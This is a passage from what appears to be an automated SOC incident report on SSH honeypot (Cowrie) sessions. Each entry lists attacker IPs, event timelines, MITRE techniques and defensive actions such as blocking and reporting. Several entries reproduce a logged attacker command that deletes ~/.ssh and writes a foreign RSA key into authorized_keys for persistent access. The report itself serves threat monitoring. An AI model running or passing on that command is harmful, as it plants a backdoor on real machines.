| `2026-07-02 12:29:02` | `cowrie.client.kex` |
| `2026-07-02 12:29:02` | `cowrie.login.success` |
| `2026-07-02 12:29:03` | `cowrie.session.params` |
| `2026-07-02 12:29:03` | `cowrie.command.input` |
| `2026-07-02 12:29:03` | `cowrie.log.closed` |
| `2026-07-02 12:29:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-16e66cb96dd9

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-02 12:29 |
| **Last Seen** | 2026-07-02 12:29 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 12:29:26` | `cowrie.session.connect` |
| `2026-07-02 12:29:26` | `cowrie.client.version` |
| `2026-07-02 12:29:26` | `cowrie.client.kex` |
| `2026-07-02 12:29:26` | `cowrie.login.success` |
| `2026-07-02 12:29:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3615de8c0af3

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-02 12:29 |
| **Last Seen** | 2026-07-02 12:29 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 12:29:27` | `cowrie.session.connect` |
| `2026-07-02 12:29:27` | `cowrie.client.version` |
| `2026-07-02 12:29:27` | `cowrie.client.kex` |
| `2026-07-02 12:29:27` | `cowrie.login.success` |
| `2026-07-02 12:29:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ff12bc4b23dd

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-02 12:29 |
| **Last Seen** | 2026-07-02 12:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 12:29:32` | `cowrie.session.connect` |
| `2026-07-02 12:29:32` | `cowrie.client.version` |
| `2026-07-02 12:29:32` | `cowrie.client.kex` |
| `2026-07-02 12:29:33` | `cowrie.login.success` |
| `2026-07-02 12:29:34` | `cowrie.session.params` |
| `2026-07-02 12:29:34` | `cowrie.command.input` |
| `2026-07-02 12:29:34` | `cowrie.log.closed` |
| `2026-07-02 12:29:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0d25d991ca59

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-02 12:29 |
| **Last Seen** | 2026-07-02 12:29 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 12:29:33` | `cowrie.session.connect` |
| `2026-07-02 12:29:34` | `cowrie.client.version` |
| `2026-07-02 12:29:34` | `cowrie.client.kex` |
| `2026-07-02 12:29:34` | `cowrie.login.success` |
| `2026-07-02 12:29:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-09f383322ce1

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-02 12:29 |
| **Last Seen** | 2026-07-02 12:29 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 12:29:34` | `cowrie.session.connect` |
| `2026-07-02 12:29:34` | `cowrie.client.version` |
| `2026-07-02 12:29:34` | `cowrie.client.kex` |
| `2026-07-02 12:29:34` | `cowrie.login.success` |
| `2026-07-02 12:29:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-22bbbc50ad90

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-02 12:30 |
| **Last Seen** | 2026-07-02 12:30 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo $HOME` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 12:30:15` | `cowrie.session.connect` |
| `2026-07-02 12:30:15` | `cowrie.client.version` |
| `2026-07-02 12:30:15` | `cowrie.client.kex` |
| `2026-07-02 12:30:15` | `cowrie.login.success` |
| `2026-07-02 12:30:17` | `cowrie.session.params` |
| `2026-07-02 12:30:17` | `cowrie.command.input` |
| `2026-07-02 12:30:17` | `cowrie.log.closed` |
| `2026-07-02 12:30:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6ffd790e34ea

| Field | Detail |
|---|---|
| **Source IP** | `45.117.179[.]232` |
| **First Seen** | 2026-07-02 12:30 |
| **Last Seen** | 2026-07-02 12:30 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 12:30:43` | `cowrie.session.connect` |
| `2026-07-02 12:30:43` | `cowrie.client.version` |
| `2026-07-02 12:30:43` | `cowrie.client.kex` |
| `2026-07-02 12:30:44` | `cowrie.login.success` |
| `2026-07-02 12:30:45` | `cowrie.session.params` |
| `2026-07-02 12:30:45` | `cowrie.command.input` |
| `2026-07-02 12:30:45` | `cowrie.command.failed` |
| `2026-07-02 12:30:46` | `cowrie.log.closed` |
| `2026-07-02 12:30:47` | `cowrie.session.params` |
| `2026-07-02 12:30:47` | `cowrie.command.input` |
| `2026-07-02 12:30:47` | `cowrie.session.file_download` |
| `2026-07-02 12:30:47` | `cowrie.log.closed` |
| `2026-07-02 12:30:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.117.179[.]232` to AbuseIPDB if not already reported
- [ ] Block `45.117.179[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f0c964ffd4c5

| Field | Detail |
|---|---|
| **Source IP** | `45.117.179[.]232` |
| **First Seen** | 2026-07-02 12:30 |
| **Last Seen** | 2026-07-02 12:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 12:30:47` | `cowrie.session.connect` |
| `2026-07-02 12:30:47` | `cowrie.client.version` |
| `2026-07-02 12:30:47` | `cowrie.client.kex` |
| `2026-07-02 12:30:48` | `cowrie.login.success` |
| `2026-07-02 12:30:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.117.179[.]232` to AbuseIPDB if not already reported
- [ ] Block `45.117.179[.]232` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-59738953add0

| Field | Detail |
|---|---|
| **Source IP** | `45.117.179[.]232` |
| **First Seen** | 2026-07-02 12:30 |
| **Last Seen** | 2026-07-02 12:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 12:30:49` | `cowrie.session.connect` |
| `2026-07-02 12:30:49` | `cowrie.client.version` |
| `2026-07-02 12:30:49` | `cowrie.client.kex` |
| `2026-07-02 12:30:50` | `cowrie.login.success` |
| `2026-07-02 12:30:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.117.179[.]232` to AbuseIPDB if not already reported
- [ ] Block `45.117.179[.]232` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-95aee5d07b83

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-02 12:31 |
| **Last Seen** | 2026-07-02 12:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 12:31:08` | `cowrie.session.connect` |
| `2026-07-02 12:31:08` | `cowrie.client.version` |
| `2026-07-02 12:31:08` | `cowrie.client.kex` |
| `2026-07-02 12:31:08` | `cowrie.login.success` |
| `2026-07-02 12:31:09` | `cowrie.session.params` |
| `2026-07-02 12:31:09` | `cowrie.command.input` |
| `2026-07-02 12:31:09` | `cowrie.log.closed` |
| `2026-07-02 12:31:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f13080979177

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-02 12:32 |
| **Last Seen** | 2026-07-02 12:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 12:32:46` | `cowrie.session.connect` |
| `2026-07-02 12:32:46` | `cowrie.client.version` |
| `2026-07-02 12:32:46` | `cowrie.client.kex` |
| `2026-07-02 12:32:46` | `cowrie.login.success` |
| `2026-07-02 12:32:47` | `cowrie.session.params` |
| `2026-07-02 12:32:47` | `cowrie.command.input` |
| `2026-07-02 12:32:47` | `cowrie.log.closed` |
| `2026-07-02 12:32:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-908400d77214

| Field | Detail |
|---|---|
| **Source IP** | `103.187.146[.]72` |
| **First Seen** | 2026-07-02 12:33 |
| **Last Seen** | 2026-07-02 12:33 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 12:33:29` | `cowrie.session.connect` |
| `2026-07-02 12:33:29` | `cowrie.client.version` |
| `2026-07-02 12:33:29` | `cowrie.client.kex` |
| `2026-07-02 12:33:30` | `cowrie.login.success` |
| `2026-07-02 12:33:31` | `cowrie.session.params` |
| `2026-07-02 12:33:31` | `cowrie.command.input` |
| `2026-07-02 12:33:31` | `cowrie.command.failed` |
| `2026-07-02 12:33:32` | `cowrie.log.closed` |
| `2026-07-02 12:33:33` | `cowrie.session.params` |
| `2026-07-02 12:33:33` | `cowrie.command.input` |
| `2026-07-02 12:33:34` | `cowrie.session.file_download` |
| `2026-07-02 12:33:34` | `cowrie.log.closed` |
| `2026-07-02 12:33:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.187.146[.]72` to AbuseIPDB if not already reported
- [ ] Block `103.187.146[.]72` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eb94fe12d7ec

| Field | Detail |
|---|---|
| **Source IP** | `60.199.224[.]2` |
| **First Seen** | 2026-07-02 12:33 |
| **Last Seen** | 2026-07-02 12:33 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 12:33:30` | `cowrie.session.connect` |
| `2026-07-02 12:33:30` | `cowrie.client.version` |
| `2026-07-02 12:33:30` | `cowrie.client.kex` |
| `2026-07-02 12:33:31` | `cowrie.login.success` |
| `2026-07-02 12:33:32` | `cowrie.session.params` |
| `2026-07-02 12:33:32` | `cowrie.command.input` |
| `2026-07-02 12:33:32` | `cowrie.command.failed` |
| `2026-07-02 12:33:33` | `cowrie.log.closed` |
| `2026-07-02 12:33:34` | `cowrie.session.params` |
| `2026-07-02 12:33:34` | `cowrie.command.input` |
| `2026-07-02 12:33:34` | `cowrie.session.file_download` |
| `2026-07-02 12:33:34` | `cowrie.log.closed` |
| `2026-07-02 12:33:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `60.199.224[.]2` to AbuseIPDB if not already reported
- [ ] Block `60.199.224[.]2` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a60d2aa77755

| Field | Detail |
|---|---|
| **Source IP** | `103.187.146[.]72` |
| **First Seen** | 2026-07-02 12:33 |
| **Last Seen** | 2026-07-02 12:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 12:33:34` | `cowrie.session.connect` |
| `2026-07-02 12:33:34` | `cowrie.client.version` |
| `2026-07-02 12:33:34` | `cowrie.client.kex` |
| `2026-07-02 12:33:35` | `cowrie.login.success` |
| `2026-07-02 12:33:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.187.146[.]72` to AbuseIPDB if not already reported
- [ ] Block `103.187.146[.]72` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a1f4a9bfd62b

| Field | Detail |
|---|---|
| **Source IP** | `60.199.224[.]2` |
| **First Seen** | 2026-07-02 12:33 |
| **Last Seen** | 2026-07-02 12:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 12:33:34` | `cowrie.session.connect` |
| `2026-07-02 12:33:34` | `cowrie.client.version` |
| `2026-07-02 12:33:35` | `cowrie.client.kex` |
| `2026-07-02 12:33:35` | `cowrie.login.success` |
| `2026-07-02 12:33:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `60.199.224[.]2` to AbuseIPDB if not already reported
- [ ] Block `60.199.224[.]2` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e40b5bd2302e

| Field | Detail |
|---|---|
| **Source IP** | `103.187.146[.]72` |
| **First Seen** | 2026-07-02 12:33 |
| **Last Seen** | 2026-07-02 12:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 12:33:36` | `cowrie.session.connect` |
| `2026-07-02 12:33:36` | `cowrie.client.version` |
| `2026-07-02 12:33:36` | `cowrie.client.kex` |
| `2026-07-02 12:33:37` | `cowrie.login.success` |
| `2026-07-02 12:33:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.187.146[.]72` to AbuseIPDB if not already reported
- [ ] Block `103.187.146[.]72` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c457369dce69

| Field | Detail |
|---|---|
| **Source IP** | `60.199.224[.]2` |
| **First Seen** | 2026-07-02 12:33 |
| **Last Seen** | 2026-07-02 12:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 12:33:36` | `cowrie.session.connect` |
| `2026-07-02 12:33:36` | `cowrie.client.version` |
| `2026-07-02 12:33:36` | `cowrie.client.kex` |
| `2026-07-02 12:33:37` | `cowrie.login.success` |
| `2026-07-02 12:33:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `60.199.224[.]2` to AbuseIPDB if not already reported
- [ ] Block `60.199.224[.]2` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b32651b99db0

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-02 12:34 |
| **Last Seen** | 2026-07-02 12:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 12:34:24` | `cowrie.session.connect` |
| `2026-07-02 12:34:24` | `cowrie.client.version` |
| `2026-07-02 12:34:25` | `cowrie.client.kex` |
| `2026-07-02 12:34:25` | `cowrie.login.success` |
| `2026-07-02 12:34:26` | `cowrie.session.params` |
| `2026-07-02 12:34:26` | `cowrie.command.input` |
| `2026-07-02 12:34:26` | `cowrie.log.closed` |
| `2026-07-02 12:34:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bab1522ab368

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-02 12:36 |
| **Last Seen** | 2026-07-02 12:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 12:36:02` | `cowrie.session.connect` |
| `2026-07-02 12:36:02` | `cowrie.client.version` |
| `2026-07-02 12:36:02` | `cowrie.client.kex` |
| `2026-07-02 12:36:02` | `cowrie.login.success` |
| `2026-07-02 12:36:03` | `cowrie.session.params` |
| `2026-07-02 12:36:03` | `cowrie.command.input` |
| `2026-07-02 12:36:03` | `cowrie.log.closed` |
| `2026-07-02 12:36:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e8f520c48daf

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-02 12:37 |
| **Last Seen** | 2026-07-02 12:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 12:37:45` | `cowrie.session.connect` |
| `2026-07-02 12:37:45` | `cowrie.client.version` |
| `2026-07-02 12:37:45` | `cowrie.client.kex` |
| `2026-07-02 12:37:45` | `cowrie.login.success` |
| `2026-07-02 12:37:46` | `cowrie.session.params` |
| `2026-07-02 12:37:46` | `cowrie.command.input` |
| `2026-07-02 12:37:46` | `cowrie.log.closed` |
| `2026-07-02 12:37:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c2ddafe4cbe7

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-02 12:38 |
| **Last Seen** | 2026-07-02 12:38 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 12:38:07` | `cowrie.session.connect` |
| `2026-07-02 12:38:08` | `cowrie.client.version` |
| `2026-07-02 12:38:08` | `cowrie.client.kex` |
| `2026-07-02 12:38:13` | `cowrie.login.success` |
| `2026-07-02 12:38:16` | `cowrie.session.params` |
| `2026-07-02 12:38:16` | `cowrie.command.input` |
| `2026-07-02 12:38:17` | `cowrie.log.closed` |
| `2026-07-02 12:38:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1247fce92ef5

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-02 12:39 |
| **Last Seen** | 2026-07-02 12:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 12:39:26` | `cowrie.session.connect` |
| `2026-07-02 12:39:26` | `cowrie.client.version` |
| `2026-07-02 12:39:26` | `cowrie.client.kex` |
| `2026-07-02 12:39:27` | `cowrie.login.success` |
| `2026-07-02 12:39:27` | `cowrie.session.params` |
| `2026-07-02 12:39:27` | `cowrie.command.input` |
| `2026-07-02 12:39:28` | `cowrie.log.closed` |
| `2026-07-02 12:39:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5050ced90444

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-07-02 12:39 |
| **Last Seen** | 2026-07-02 12:39 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 12:39:53` | `cowrie.session.connect` |
| `2026-07-02 12:39:53` | `cowrie.client.version` |
| `2026-07-02 12:39:53` | `cowrie.client.kex` |
| `2026-07-02 12:39:54` | `cowrie.login.success` |
| `2026-07-02 12:39:57` | `cowrie.session.params` |
| `2026-07-02 12:39:57` | `cowrie.command.input` |
| `2026-07-02 12:39:58` | `cowrie.log.closed` |
| `2026-07-02 12:39:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3d43e7c29379

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-02 12:41 |
| **Last Seen** | 2026-07-02 12:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 12:41:02` | `cowrie.session.connect` |
| `2026-07-02 12:41:02` | `cowrie.client.version` |
| `2026-07-02 12:41:03` | `cowrie.client.kex` |
| `2026-07-02 12:41:03` | `cowrie.login.success` |
